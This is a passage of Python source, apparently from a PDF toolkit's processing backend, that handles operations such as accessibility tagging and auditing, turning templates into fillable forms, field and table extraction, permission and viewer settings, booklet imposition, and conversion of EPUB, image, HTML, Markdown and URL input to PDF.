                    tot = sum(len(v) for v in info["bm"].values())
                    row = _A([None] * tot)
                    kinds = info["kinds"]
                    for b in sorted(info["bm"]):
                        ms = info["bm"][b]
                        kk = ms[0] if len(ms) == 1 else _A(ms)
                        el = pdf.make_indirect(_D(Type=_Nm.StructElem, S=_Nm("/" + kinds[b]),
                                                  P=de, Pg=page.obj, K=kk))
                        if kinds[b] == "Figure":
                            a = str(alts[fig_i]).strip() if fig_i < len(alts) else ""
                            el.Alt = _S(a if a else "Figure %d" % (fig_i + 1))
                            fig_i += 1
                            if not a:
                                need_alt += 1
                        de.K.append(el)
                        counts[kinds[b]] += 1
                        for m in ms:
                            row[m] = el
                    nums.append(key)
                    nums.append(pdf.make_indirect(row))

                total = sum(counts.values())
                if total == 0:
                    pdf.close()
                    result = {"ok": False, "error": "tag_pdf: no taggable text or images found — "
                              "if this is a scanned/image-only PDF, run `ocr` first to add a text layer"}
                else:
                    sr.ParentTree = pdf.make_indirect(_D(Nums=nums))
                    sr.ParentTreeNextKey = nk
                    pdf.Root.StructTreeRoot = sr
                    pdf.Root.MarkInfo = _D(Marked=True)
                    if lang:
                        pdf.Root.Lang = _S(lang)
                    if title:
                        pdf.docinfo[_Nm.Title] = _S(title)
                        vp = pdf.Root.get("/ViewerPreferences")
                        if vp is None:
                            pdf.Root.ViewerPreferences = _D(DisplayDocTitle=True)
                        else:
                            vp.DisplayDocTitle = True
                    pdf.save(out_pdf)
                    pdf.close()
                    _parts = ", ".join("%d %s" % (counts[k], k)
                                       for k in ("H1", "H2", "H3", "P", "Figure") if counts.get(k))
                    note = "tagged %d element(s): %s" % (total, _parts)
                    if need_alt:
                        note += " · %d figure(s) need real alt text (pass `alt`)" % need_alt
                    if lang:
                        note += " · /Lang=%s" % lang
                    if title:
                        note += " · title set"
                    result["changed"] = True
                    result["note"] = note

        elif op == "check_accessibility":
            # Report-only PDF/UA / Section-508 / WCAG audit (never changes the PDF): is there a
            # document title, a default language, a tag tree (StructTreeRoot + MarkInfo/Marked),
            # does the reader show the title not the filename, do images carry alt text and form
            # fields carry tooltips. Writes a JSON report and, with format markdown/both, a
            # human checklist beside it.
            import pikepdf
            to = params.get("to") or "output/accessibility.json"
            fmt = str(params.get("format") or "json").strip().lower()

            checks = []

            def _chk(cid, label, status, detail):
                checks.append({"id": cid, "label": label, "status": status, "detail": detail})

            meta = doc.metadata or {}
            title = str(meta.get("title") or "").strip()

            # Catalog + form-field inspection in one pikepdf pass.
            lang = ""
            marked = False
            struct = False
            display_title = None
            widgets = 0
            no_tu = 0
            try:
                with pikepdf.open(in_pdf) as pdf:
                    root = pdf.Root
                    try:
                        lang = str(root.get("/Lang") or "").strip()
                    except Exception:  # noqa: BLE001
                        lang = ""
                    try:
                        mi = root.get("/MarkInfo")
                        marked = bool(mi is not None and mi.get("/Marked"))
                    except Exception:  # noqa: BLE001
                        marked = False
                    try:
                        struct = root.get("/StructTreeRoot") is not None
                    except Exception:  # noqa: BLE001
                        struct = False
                    try:
                        vp = root.get("/ViewerPreferences")
                        if vp is not None and vp.get("/DisplayDocTitle") is not None:
                            display_title = bool(vp.get("/DisplayDocTitle"))
                    except Exception:  # noqa: BLE001
                        display_title = None
                    for page in pdf.pages:
                        try:
                            annots = page.get("/Annots")
                        except Exception:  # noqa: BLE001
                            annots = None
                        for annot in (annots or []):
                            try:
                                if str(annot.get("/Subtype")) == "/Widget":
                                    widgets += 1
                                    if not str(annot.get("/TU") or "").strip():
                                        no_tu += 1
                            except Exception:  # noqa: BLE001
                                pass
            except Exception as e:  # noqa: BLE001
                _chk("catalog", "Document structure is readable", "warn", "could not inspect the catalog: %s" % e)

            tagged = struct and marked

            # Image alt text: images can only carry /Alt inside a tag tree.
            images = 0
            for pno in range(doc.page_count):
                try:
                    images += len(doc.load_page(pno).get_images(full=True))
                except Exception:  # noqa: BLE001
                    pass

            _chk("document_title", "Document has a title", "pass" if title else "fail",
                 ("title: %s" % title) if title else "no /Title in metadata — set one with set_metadata")
            _chk("language", "A default language is set", "pass" if lang else "fail",
                 ("/Lang = %s" % lang) if lang else "no /Lang — assistive tech can't pick the right voice; set one with set_language")
            _chk("tagged", "Document is tagged (has a structure tree)", "pass" if tagged else "fail",
                 "StructTreeRoot present and MarkInfo/Marked is true" if tagged else
                 ("StructTreeRoot present but MarkInfo/Marked is not set — tag it with tag_pdf" if struct else
                  "no StructTreeRoot — the document is untagged; build one with tag_pdf"))
            _chk("title_shown", "Reader shows the title, not the filename",
                 "pass" if display_title else "warn",
                 "ViewerPreferences/DisplayDocTitle is true" if display_title else
                 "DisplayDocTitle is not true — set it with set_view_preferences (display_doc_title: true)")
            if images == 0:
                _chk("image_alt", "Images have alternative text", "pass", "no images")
            elif not tagged:
                _chk("image_alt", "Images have alternative text", "fail",
                     "%d image placement(s) but the document is untagged — images can't carry alt text until it is; "
                     "run tag_pdf (its `alt` list captions the figures in order)" % images)
            else:
                _chk("image_alt", "Images have alternative text", "warn",
                     "%d image placement(s) — verify each meaningful image has an /Alt in the tag tree" % images)
            if widgets == 0:
                _chk("form_tooltips", "Form fields have tooltips", "pass", "no form fields")
            elif no_tu:
                _chk("form_tooltips", "Form fields have tooltips", "warn",
                     "%d of %d form field(s) have no /TU tooltip — add one so screen readers announce the field" % (no_tu, widgets))
            else:
                _chk("form_tooltips", "Form fields have tooltips", "pass",
                     "all %d form field(s) have a tooltip" % widgets)

            n_fail = sum(1 for c in checks if c["status"] == "fail")
            n_warn = sum(1 for c in checks if c["status"] == "warn")
            n_pass = sum(1 for c in checks if c["status"] == "pass")
            overall = "fail" if n_fail else ("warn" if n_warn else "pass")
            report = {
                "overall": overall,
                "summary": {"pass": n_pass, "warn": n_warn, "fail": n_fail, "total": len(checks)},
                "title": title, "language": lang, "tagged": tagged,
                "images": images, "form_fields": widgets,
                "checks": checks,
            }

            base, ext = os.path.splitext(to)
            if fmt in ("json", "both"):
                json_to = (base + ".json") if ext.lower() == ".md" else to
                with open(os.path.join(art_dir, "accessibility.json"), "w", encoding="utf-8") as f:
                    json.dump(report, f, indent=2, ensure_ascii=False)
                result["artifacts"].append({"tmp": "accessibility.json", "path": json_to, "kind": "json"})
            if fmt in ("markdown", "md", "both"):
                md_to = to if ext.lower() == ".md" else base + ".md"
                icon = {"pass": "✅", "warn": "⚠️", "fail": "❌"}
                lines = ["# Accessibility check", "",
                         "**Overall: %s** — %d passed, %d warning(s), %d failure(s)."
                         % (overall.upper(), n_pass, n_warn, n_fail),
                         "", "| | Check | Detail |", "|---|---|---|"]
                for c in checks:
                    lines.append("| %s | %s | %s |"
                                 % (icon.get(c["status"], ""), c["label"], str(c["detail"]).replace("|", "\\|")))
                with open(os.path.join(art_dir, "accessibility.md"), "w", encoding="utf-8") as f:
                    f.write("\n".join(lines) + "\n")
                result["artifacts"].append({"tmp": "accessibility.md", "path": md_to, "kind": "text"})

            result["changed"] = False
            result["note"] = ("accessibility: %s — %d pass / %d warn / %d fail%s"
                              % (overall, n_pass, n_warn, n_fail, "" if tagged else " · untagged"))

        elif op == "extract_attachments":
            to = (params.get("to") or "output/attachments").rstrip("/")
            names = list(doc.embfile_names())
            for i, name in enumerate(names):
                content = doc.embfile_get(name)
                fn = "att_%d_%s" % (i, os.path.basename(name) or "file")
                with open(os.path.join(art_dir, fn), "wb") as f:
                    f.write(content)
                kind = "pdf" if str(name).lower().endswith(".pdf") else "text"
                result["artifacts"].append({"tmp": fn, "path": "%s/%s" % (to, os.path.basename(name) or fn), "kind": kind})
            result["note"] = "extracted %d attachment(s)" % len(names)

        elif op == "add_attachments":
            rel = _safe_rel(params.get("file"))
            if not rel or not os.path.exists(rel):
                result = {"ok": False, "error": "add_attachments: file not found: %s" % params.get("file")}
            else:
                with open(rel, "rb") as f:
                    content = f.read()
                name = str(params.get("name") or os.path.basename(rel))
                doc.embfile_add(name, content, filename=os.path.basename(rel))
                doc.save(out_pdf, garbage=3, deflate=True)
                result["changed"] = True
                result["note"] = "attached '%s' (%d bytes)" % (name, len(content))

        elif op == "create_form":
            # Template -> fillable PDF. A conversion op has already rendered the DOCX/MD/HTML,
            # so each [[tag]] the author typed is literal text on the page: find it, delete it,
            # and put a real widget in its place. The field CONFIG is normalized in core (the
            # sidecar has no yaml); this handler just does geometry + widgets.
            specs = {f["key"]: f for f in (params.get("fields") or [])}
            style = dict(DEFAULT_STYLE)
            style.update(params.get("style") or {})
            declared = set(specs)
            zero_config = not declared
            strict = bool(params.get("strict", True))
            rx = _tag_regex(str(params.get("tag") or "[[key]]"))

            created, seen, dupes, orphan_frags, warnings, undeclared = [], {}, [], [], [], []
            counters, anon = {}, []
            for pno in range(doc.page_count):
                page = doc.load_page(pno)
                if page.rotation:
                    raise ValueError(
                        "page %d is rotated %d° — create_form can't place fields on a rotated "
                        "page yet; un-rotate the source and re-convert" % (pno + 1, page.rotation)
                    )
                text, cboxes = _char_spans(page)
                cells = _page_cells(page)  # a field should fill its table cell, not its marker
                # Collect first, then order by READING ORDER (top-to-bottom, left-to-right)
                # so the auto-numbering of anonymous tags is predictable: the 3rd [[check]]
                # down the page is check_03, whatever order the text layer happens to store.
                raw_hits = []
                for m in rx.finditer(text):
                    anchor = _union_rect(cboxes[m.start():m.end()])
                    if anchor is not None:
                        raw_hits.append((m.group(1), m.group(2), anchor))
                raw_hits.sort(key=lambda h: (round(h[2].y0, 1), round(h[2].x0, 1)))

                hits = []
                for token, inline_w, anchor in raw_hits:
                    if token in TYPE_TOKENS:
                        # Anonymous: [[check]] repeated 95 times is the POINT, not a duplicate.
                        typ = TYPE_TOKENS[token]
                        counters[typ] = counters.get(typ, 0) + 1
                        key = "%s_%02d" % (typ, counters[typ])
                        spec = dict(specs.get(key) or {})
                        spec.setdefault("type", typ)
                        spec["key"] = key
                        anon.append(key)
                    else:
                        key = token
                        if key in seen:
                            dupes.append((key, seen[key], pno + 1))
                            continue
                        seen[key] = pno + 1
                        spec = dict(specs.get(key) or {})
                        if not spec:
                            if zero_config:
                                spec = {"key": key, "type": "text"}
                            else:
                                # A named tag the config doesn't mention is nearly always a
                                # typo, and quietly minting a text field for it is how a form
                                # ships with the wrong field name.
                                undeclared.append((key, pno + 1))
                                if strict:
                                    continue
                                spec = {"key": key, "type": "text"}
                    if inline_w:
                        spec["width"] = int(inline_w)  # inline |w= wins over the config
                    hits.append((spec, anchor, 0, 0))

                # Any [[ / ]] left over means a marker the converter clipped or wrapped —
                # a broken tag that would otherwise get baked into the delivered PDF.
                for frag in _orphan_fragments(text, rx):
                    orphan_frags.append((frag, pno + 1))

                # Redact FIRST, then add widgets: apply_redactions drops annotations that sit
                # inside a redaction rect, and the marker rect is exactly where the widget goes.
                if not params.get("keep_tags") and not params.get("preview"):
                    for _, anchor, _, _ in hits:
                        page.add_redact_annot(anchor)
                    if hits:
                        page.apply_redactions(images=fitz.PDF_REDACT_IMAGE_NONE)

                for spec, anchor, _, _ in hits:
                    rect, geo_warn = _widget_rect(spec, anchor, page.rect, cells)
                    if geo_warn:
                        warnings.append("%s: %s" % (spec["key"], geo_warn))
                    rec = {"key": spec["key"], "type": spec.get("type", "text"), "page": pno + 1,
                           "rect": [round(v, 1) for v in rect]}
                    label = _row_label(page, rect, [r for _, r, _, _ in hits], _enclosing_cell(anchor, cells))
                    if label:
                        rec["near"] = label
                    if not params.get("preview"):
                        _add_form_widget(page, spec, rect, style)
                    created.append(rec)

                for a, b in _overlaps(created, pno + 1):
                    warnings.append('fields "%s" and "%s" overlap on page %d' % (a, b, pno + 1))

            missing = sorted(declared - set(seen) - set(anon))
            problems = []
            if missing:
                problems.append(
                    "these declared field(s) were not found in the converted PDF: %s — the tag is "
                    "likely too long for its column (clipped), hyphenated, or wrapped across two "
                    "lines. Shorten the key, widen the column, or set strict: false." % ", ".join(missing)
                )
            if orphan_frags:
                problems.append(
                    "broken marker fragment(s) left on the page: %s — same causes as above; they "
                    "would be baked into the output." % ", ".join("%r (p%d)" % f for f in orphan_frags)
                )
            if undeclared:
                problems.append(
                    "tag(s) in the document with no entry in the field config: %s — a typo in the tag "
                    "or a missing config entry. Add them, or set strict: false to accept them as text "
                    "fields." % ", ".join("%s (p%d)" % u for u in undeclared)
                )
            if dupes:
                problems.append(
                    "duplicate tag(s): %s — a repeated tag (e.g. in a header/footer) would make one "
                    "mirrored field. Give each its own key." % ", ".join("%s (p%d and p%d)" % d for d in dupes)
                )
            if strict and problems:
                raise ValueError(" | ".join(problems))
            warnings.extend(problems)

            report = {"created": created, "missing": missing, "warnings": warnings,
                      "orphan_fragments": ["%s (page %d)" % f for f in orphan_frags],
                      "duplicates": ["%s (pages %d, %d)" % d for d in dupes]}
            to = params.get("to") or "output/form-map.json"
            with open(os.path.join(art_dir, "form-map.json"), "w", encoding="utf-8") as f:
                json.dump(report, f, indent=2, ensure_ascii=False)
            result["artifacts"].append({"tmp": "form-map.json", "path": to, "kind": "json"})

            if params.get("preview"):
                # No PDF: the working doc still has visible [[tags]] and no fields, and writing
                # it under the output name would look exactly like a finished form.
                result["changed"] = False
                result["preview"] = True
                result["note"] = "PREVIEW: %d field(s) would be created%s — no PDF written; see %s" % (
                    len(created), (", %d issue(s)" % len(warnings)) if warnings else "", to)
            else:
                if params.get("debug"):
                    _write_debug_overlay(doc, created, art_dir)
                    result["artifacts"].append({"tmp": "form-debug.pdf",
                                                "path": params.get("debug_to") or "output/form-debug.pdf",
                                                "kind": "pdf"})
                _finalize_acroform(doc)
                doc.save(out_pdf, garbage=3, deflate=True)
                result["changed"] = True
                result["note"] = "created %d form field(s)%s · map → %s" % (
                    len(created), (" · %d warning(s)" % len(warnings)) if warnings else "", to)

        elif op == "extract_form":
            # Dump every input's raw AcroForm fields. The pack mapping (raw field →
            # friendly key) lives in core, so this handler stays dumb on purpose: it
            # reads widgets, core reads meaning.
            targets = input_files or [in_pdf]
            dump = []
            for path in targets:
                try:
                    fdoc = fitz.open(path)
                except Exception as e:
                    dump.append({"error": str(e), "fields": []})
                    continue
                try:
                    recs = []
                    for pno in range(fdoc.page_count):
                        for w in (fdoc.load_page(pno).widgets() or []):
                            recs.append({"name": w.field_name or "", "type": w.field_type_string or "",
                                         "value": w.field_value if isinstance(w.field_value, str) else
                                                  ("" if w.field_value is None else str(w.field_value))})
                    dump.append({"fields": recs})
                finally:
                    fdoc.close()
            with open(os.path.join(art_dir, "raw_fields.json"), "w", encoding="utf-8") as f:
                json.dump(dump, f, ensure_ascii=False)
            result["artifacts"].append({"tmp": "raw_fields.json", "path": "__raw__", "kind": "json"})
            result["note"] = "read %d form(s)" % len(dump)

        elif op == "extract_fields":
            fmt = str(params.get("format") or "csv").lower()
            recs = []
            for pno in range(doc.page_count):
                for w in (doc.load_page(pno).widgets() or []):
                    rec = {"page": pno + 1, "name": w.field_name or "",
                           "type": w.field_type_string or "", "value": w.field_value or ""}
                    tu = getattr(w, "field_label", None)
                    if tu:
                        rec["label"] = tu
                    ons = _widget_on_states(w)
                    if ons:
                        rec["on_states"] = ons
                    cv = getattr(w, "choice_values", None)
                    if cv:
                        rec["choices"] = list(cv)
                    ml = getattr(w, "text_maxlen", 0) or 0
                    if ml:
                        rec["maxlen"] = ml
                    try:
                        rc = w.rect
                        rec["rect"] = [round(rc.x0, 1), round(rc.y0, 1), round(rc.x1, 1), round(rc.y1, 1)]
                    except Exception:
                        pass
                    recs.append(rec)
            if fmt == "json":
                to = params.get("to") or "output/fields.json"
                with open(os.path.join(art_dir, "fields.json"), "w", encoding="utf-8") as f:
                    json.dump(recs, f, indent=2, ensure_ascii=False)
                result["artifacts"].append({"tmp": "fields.json", "path": to, "kind": "json"})
            else:
                import csv as _csv
                import io as _io
                to = params.get("to") or "output/fields.csv"
                rows = [["page", "name", "type", "value", "label", "on_states", "choices", "maxlen"]]
                for r in recs:
                    rows.append([r["page"], r["name"], r["type"], r.get("value", ""), r.get("label", ""),
                                 "|".join(r.get("on_states", [])), "|".join(map(str, r.get("choices", []))),
                                 r.get("maxlen", "")])
                buf = _io.StringIO()
                _csv.writer(buf).writerows([[_csv_safe(c) for c in r] for r in rows])
                with open(os.path.join(art_dir, "fields.csv"), "w", encoding="utf-8", newline="") as f:
                    f.write(buf.getvalue())
                result["artifacts"].append({"tmp": "fields.csv", "path": to, "kind": "text"})
            result["note"] = "extracted %d form field(s)%s" % (len(recs), " (json)" if fmt == "json" else "")

        elif op == "extract_tables":
            import csv as _csv
            import io as _io
            to = (params.get("to") or "output/tables").rstrip("/")
            count = 0
            for pno in range(doc.page_count):
                page = doc.load_page(pno)
                try:
                    tabs = getattr(page.find_tables(), "tables", [])
                except Exception:
                    tabs = []
                for ti, tab in enumerate(tabs):
                    buf = _io.StringIO()
                    writer = _csv.writer(buf)
                    for row in tab.extract():
                        writer.writerow([_csv_safe(c) for c in row])
                    fn = "table_p%d_%d.csv" % (pno + 1, ti + 1)
                    with open(os.path.join(art_dir, fn), "w", encoding="utf-8", newline="") as f:
                        f.write(buf.getvalue())
                    result["artifacts"].append({"tmp": fn, "path": "%s/%s" % (to, fn), "kind": "text"})
                    count += 1
            result["note"] = "extracted %d table(s)" % count

        elif op == "repair":
            try:
                import pikepdf
            except Exception as e:  # noqa: BLE001
                result = {"ok": False, "error": "pikepdf not installed: %s" % e}
            else:
                doc.close()
                pdf = pikepdf.open(in_pdf)
                pdf.save(out_pdf)
                pdf.close()
                result["changed"] = True
                result["note"] = "repaired (rewritten)"

        elif op == "decompress":
            try:
                import pikepdf
            except Exception as e:  # noqa: BLE001
                result = {"ok": False, "error": "pikepdf not installed: %s" % e}
            else:
                doc.close()
                pdf = pikepdf.open(in_pdf)
                pdf.save(out_pdf, qdf=True, compress_streams=False)
                pdf.close()
                result["changed"] = True
                result["note"] = "decompressed (uncompressed streams)"

        elif op == "set_permissions":
            try:
                import pikepdf
            except Exception as e:  # noqa: BLE001
                result = {"ok": False, "error": "pikepdf not installed: %s" % e}
            else:
                allow = params.get("allow") or {}
                can_print = bool(allow.get("print", True))
                perms = pikepdf.Permissions(
                    extract=bool(allow.get("copy", True)),
                    modify_annotation=bool(allow.get("annotate", True)),
                    modify_assembly=bool(allow.get("assemble", True)),
                    modify_form=bool(allow.get("fill_form", True)),
                    modify_other=bool(allow.get("modify", True)),
                    print_lowres=can_print,
                    print_highres=can_print,
                )
                doc.close()
                pdf = pikepdf.open(in_pdf)
                enc = pikepdf.Encryption(owner=str(params.get("owner_password") or ""), user="", allow=perms)
                pdf.save(out_pdf, encryption=enc)
                pdf.close()
                result["changed"] = True
                result["note"] = "applied permission restrictions"

        elif op == "set_view_preferences":
            try:
                import pikepdf
            except Exception as e:  # noqa: BLE001
                result = {"ok": False, "error": "pikepdf not installed: %s (pip install pikepdf)" % e}
            else:
                _LAYOUTS = {"SinglePage", "OneColumn", "TwoColumnLeft", "TwoColumnRight", "TwoPageLeft", "TwoPageRight"}
                _MODES = {"UseNone", "UseOutlines", "UseThumbs", "FullScreen", "UseOC", "UseAttachments"}
                layout = params.get("page_layout")
                mode = params.get("page_mode")
                bad = None
                if layout is not None and str(layout) not in _LAYOUTS:
                    bad = "page_layout must be one of %s" % ", ".join(sorted(_LAYOUTS))
                elif mode is not None and str(mode) not in _MODES:
                    bad = "page_mode must be one of %s" % ", ".join(sorted(_MODES))
                if bad:
                    result = {"ok": False, "error": bad}
                else:
                    doc.close()
                    pdf = pikepdf.open(in_pdf)
                    root = pdf.Root
                    applied = []
                    if layout is not None:
                        root.PageLayout = pikepdf.Name("/" + str(layout))
                        applied.append("layout=%s" % layout)
                    if mode is not None:
                        root.PageMode = pikepdf.Name("/" + str(mode))
                        applied.append("mode=%s" % mode)
                    # ViewerPreferences: chrome the reader shows around the document.
                    vp_flags = {"hide_toolbar": "HideToolbar", "hide_menubar": "HideMenubar",
                                "hide_window_ui": "HideWindowUI", "fit_window": "FitWindow",
                                "center_window": "CenterWindow", "display_doc_title": "DisplayDocTitle"}
                    vp = pikepdf.Dictionary()
                    for pk, name in vp_flags.items():
                        if pk in params:
                            vp[pikepdf.Name("/" + name)] = bool(params[pk])
                            applied.append("%s=%s" % (name, bool(params[pk])))
                    if len(vp.keys()):
                        root.ViewerPreferences = vp
                    # OpenAction: which page + zoom the document opens at.
                    open_page = params.get("open_page")
                    zoom = params.get("zoom")
                    if open_page is not None or zoom is not None:
                        idx = max(1, int(open_page or 1)) - 1
                        idx = min(idx, len(pdf.pages) - 1)
                        pref = pdf.pages[idx].obj
                        if zoom is None or str(zoom).lower() == "fit":
                            dest = pikepdf.Array([pref, pikepdf.Name("/Fit")])
                        elif str(zoom).lower() in ("fit-width", "fitwidth", "fit_width"):
                            dest = pikepdf.Array([pref, pikepdf.Name("/FitH"), pikepdf.Object.parse(b"null")])
                        else:
                            try:
                                z = float(str(zoom).rstrip("%")) / 100.0
                            except ValueError:
                                z = 1.0
                            dest = pikepdf.Array([pref, pikepdf.Name("/XYZ"),
                                                  pikepdf.Object.parse(b"null"), pikepdf.Object.parse(b"null"), z])
                        root.OpenAction = dest
                        applied.append("open=p%d%s" % (idx + 1, "" if zoom is None else " @%s" % zoom))
                    pdf.save(out_pdf)
                    pdf.close()
                    result["changed"] = True
                    result["note"] = "set viewer preferences (%s)" % (", ".join(applied) if applied else "none")

        elif op == "unlock_forms":
            try:
                import pikepdf
            except Exception as e:  # noqa: BLE001
                result = {"ok": False, "error": "pikepdf not installed: %s" % e}
            else:
                doc.close()
                pdf = pikepdf.open(in_pdf)
                n = [0]

                def _clear_ro(fields):
                    for fld in fields:
                        try:
                            if "/Ff" in fld:
                                ff = int(fld.Ff)
                                if ff & 1:
                                    fld.Ff = ff & ~1
                                    n[0] += 1
                        except Exception:
                            pass
                        if "/Kids" in fld:
                            _clear_ro(fld.Kids)

                try:
                    if "/AcroForm" in pdf.Root and "/Fields" in pdf.Root.AcroForm:
                        _clear_ro(pdf.Root.AcroForm.Fields)
                except Exception:
                    pass
                pdf.save(out_pdf)
                pdf.close()
                result["changed"] = True
                result["note"] = "cleared read-only on %d field(s)" % n[0]

        elif op == "pdf_to_pdfa":
            try:
                import ocrmypdf  # noqa: F401
            except Exception as e:  # noqa: BLE001
                result = {"ok": False, "error": "OCRmyPDF not installed: %s (pip install ocrmypdf)" % e}
            else:
                doc.close()
                # skip_text avoids the "page already has text" abort; timeout=0 means no OCR
                # is performed — pure PDF/A conversion. Shares the P0-2 exit-4 salvage.
                res = _ocrmypdf_hardened(in_pdf, out_pdf,
                    {"output_type": "pdfa", "skip_text": True, "tesseract_timeout": 0, "progress_bar": False},
                    "converted to PDF/A")
                if not res.get("ok"):
                    res["error"] = res.get("error", "") + " (needs OCRmyPDF + Ghostscript)"
                elif res.pop("salvaged", False):
                    # a pikepdf salvage rewrite can drop PDF/A XMP + OutputIntents
                    res["note"] = (res.get("note") or "") + " (PDF/A conformance not guaranteed after repair)"
                res.pop("salvaged", None)
                result = res

        elif op == "rasterize":
            dpi = _clamp_dpi(params.get("dpi"))
            out, _ds = _rasterize_doc(doc, dpi)
            out.save(out_pdf, deflate=True)
            out.close()
            result["changed"] = True
            result["note"] = ("rasterized %d page(s) at %d dpi" % (doc.page_count, dpi)) + _downscale_note(_ds, dpi)

        elif op == "booklet":
            n = doc.page_count
            padded = n + ((4 - n % 4) % 4)
            order = []
            a, b = 1, padded
            while a < b:
                order.extend([b, a, a + 1, b - 1])
                a += 2
                b -= 2
            w = doc[0].rect.width
            h = doc[0].rect.height
            out = fitz.open()
            for i in range(0, len(order), 2):
                sheet = out.new_page(width=w * 2, height=h)
                for j in range(2):
                    pno = order[i + j] - 1
                    if 0 <= pno < n:
                        sheet.show_pdf_page(fitz.Rect(j * w, 0, (j + 1) * w, h), doc, pno)
            out.save(out_pdf, garbage=3, deflate=True)
            out.close()
            result["changed"] = True
            result["note"] = "imposed %d page(s) into a %d-sheet booklet" % (n, len(order) // 4)

        elif op == "poster":
            rows = max(1, int(params.get("rows", 2)))
            cols = max(1, int(params.get("cols", 2)))
            out = fitz.open()
            tiles = 0
            for pno in range(doc.page_count):
                r = doc.load_page(pno).rect
                tw = r.width / cols
                th = r.height / rows
                for ry in range(rows):
                    for cx in range(cols):
                        clip = fitz.Rect(r.x0 + cx * tw, r.y0 + ry * th, r.x0 + (cx + 1) * tw, r.y0 + (ry + 1) * th)
                        tile = out.new_page(width=tw, height=th)
                        tile.show_pdf_page(fitz.Rect(0, 0, tw, th), doc, pno, clip=clip)
                        tiles += 1
            out.save(out_pdf, garbage=3, deflate=True)
            out.close()
            result["changed"] = True
            result["note"] = "split into %d %dx%d poster tile(s)" % (tiles, cols, rows)

        elif op == "epub_to_pdf":
            import shutil
            src = os.path.join(art_dir, "book.epub")
            shutil.copyfile(in_pdf, src)  # give the openers a real .epub extension
            engine = str(params.get("engine") or "auto").lower()
            used = None
            # Calibre paginates best when present; PyMuPDF (bundled) always works.
            if engine in ("auto", "calibre"):
                exe = shutil.which("ebook-convert")
                if exe:
                    try:
                        cmd = [exe, src, out_pdf]
                        ps = params.get("paper_size")
                        if ps:
                            cmd += ["--paper-size", str(ps).lower()]
                        subprocess.run(cmd, check=True, capture_output=True, timeout=1200)
                        used = "calibre"
                    except Exception:  # noqa: BLE001
                        used = None
            if used is None and engine == "calibre":
                result = {"ok": False, "error": "epub_to_pdf: Calibre 'ebook-convert' not found or failed — install Calibre, or drop `engine` to use the bundled PyMuPDF."}
            elif used is None:
                try:
                    import fitz
                    ebook = fitz.open(src)
                    pdf_bytes = ebook.convert_to_pdf()
                    with open(out_pdf, "wb") as f:
                        f.write(pdf_bytes)
                    ebook.close()
                    used = "pymupdf"
                except Exception as e:  # noqa: BLE001
                    result = {"ok": False, "error": "epub_to_pdf failed: %s" % e}
            if used is not None and (not isinstance(result, dict) or result.get("ok", True)):
                result["changed"] = True
                result["note"] = "converted EPUB → PDF (%s)" % used

        elif op == "images_to_pdf":
            import fitz
            files = [f for f in input_files if os.path.exists(f)]
            if not files:
                result = {"ok": False, "error": "images_to_pdf: no input images"}
            else:
                out = fitz.open()
                added, skipped = 0, []
                for f in files:
                    ok = False
                    try:  # PyMuPDF opens png/jpg/jpeg/bmp/gif/tiff/pnm/svg + webp directly
                        img = fitz.open(f)
                        pdfbytes = img.convert_to_pdf()
                        img.close()
                        out.insert_pdf(fitz.open("pdf", pdfbytes))
                        ok = True
                    except Exception:  # noqa: BLE001 — fall back to Pillow (HEIC/WEBP/…)
                        try:
                            from PIL import Image
                            try:
                                import pillow_heif  # noqa: F401 — registers HEIC/HEIF opener
                                pillow_heif.register_heif_opener()
                            except Exception:  # noqa: BLE001
                                pass
                            im = Image.open(f).convert("RGB")
                            png = os.path.join(art_dir, "conv_%d.png" % added)
                            im.save(png)
                            pimg = fitz.open(png)
                            out.insert_pdf(fitz.open("pdf", pimg.convert_to_pdf()))
                            pimg.close()
                            ok = True
                        except Exception:  # noqa: BLE001
                            ok = False
                    if ok:
                        added += 1
                    else:
                        skipped.append(os.path.basename(f))
                # A skipped .heic is almost always ONE missing package, not a broken file —
                # say which, whether or not anything else succeeded. Without this the note
                # reads "skipped 1 (photo.heic)" and leaves the user guessing.
                heic_skipped = [s for s in skipped if os.path.splitext(s)[1].lower() in (".heic", ".heif")]
                heic_hint = ""
                if heic_skipped:
                    try:
                        import pillow_heif  # noqa: F401
                    except Exception:  # noqa: BLE001
                        heic_hint = " — HEIC needs `pillow-heif`: pip install pillow-heif (or use the Dependencies view)"
                if added == 0:
                    result = {"ok": False, "error": "images_to_pdf: no readable images%s" % (heic_hint or "")}
                else:
                    out.save(out_pdf, garbage=3, deflate=True)
                    result["changed"] = True
                    note = "built PDF from %d image(s)" % added
                    if skipped:
                        note += " · skipped %d (%s)%s" % (len(skipped), ", ".join(skipped[:3]), heic_hint)
                    result["note"] = note
                out.close()

        elif op == "html_to_pdf":
            if _looks_like_pdf(in_pdf):
                raise ValueError("html_to_pdf expects an HTML input, but got a PDF — make it the first operation with a .html input")
            with open(in_pdf, "r", encoding="utf-8", errors="replace") as f:
                html = f.read()
            # A full document keeps its own styling; a bare fragment gets our theme.
            if "<html" not in html.lower() and "<body" not in html.lower():
                html = _html_document(html)
            used = _render_html_to_pdf(html, out_pdf, params.get("engine"), base_url=os.getcwd(),
                                       sanitize=_sanitize_flag(params))
            result["changed"] = True
            result["note"] = "rendered HTML → PDF (via %s)" % used

        elif op == "markdown_to_pdf":
            if _looks_like_pdf(in_pdf):
                raise ValueError("markdown_to_pdf expects a Markdown input, but got a PDF — make it the first operation with a .md input")
            with open(in_pdf, "r", encoding="utf-8", errors="replace") as f:
                md = f.read()
            try:
                import markdown as _md
                html = _md.markdown(
                    md,
                    extensions=["tables", "fenced_code", "sane_lists", "toc", "nl2br", "codehilite"],
                    extension_configs={"codehilite": {"noclasses": True, "guess_lang": False}},
                )
            except Exception:
                try:
                    import markdown as _md
                    html = _md.markdown(md, extensions=["tables", "fenced_code", "sane_lists"])
                except Exception:
                    import html as _h
                    html = "<pre>%s</pre>" % _h.escape(md)
            title = os.path.splitext(os.path.basename(in_pdf))[0]
            used = _render_html_to_pdf(_html_document(html, title=title), out_pdf, params.get("engine"),
                                       base_url=os.getcwd(), sanitize=_sanitize_flag(params))
            result["changed"] = True
            result["note"] = "rendered Markdown → PDF (via %s)" % used

        elif op == "url_to_pdf":
            url = params.get("url")
            if not url or not str(url).lower().startswith(("http://", "https://")):
                result = {"ok": False, "error": "url_to_pdf requires url: http(s)://..."}
            else:
                # Before ANY engine touches it — chrome, weasyprint and urllib each
                # fetch independently, so the check cannot live in one of them.
                _assert_fetchable_url(url)
                engine = str(params.get("engine") or "auto").lower()
                if engine in ("auto", "chrome"):
                    try:
                        used = "chrome (%s)" % _render_via_chrome(None, out_pdf, url=str(url))
                        result["changed"] = True
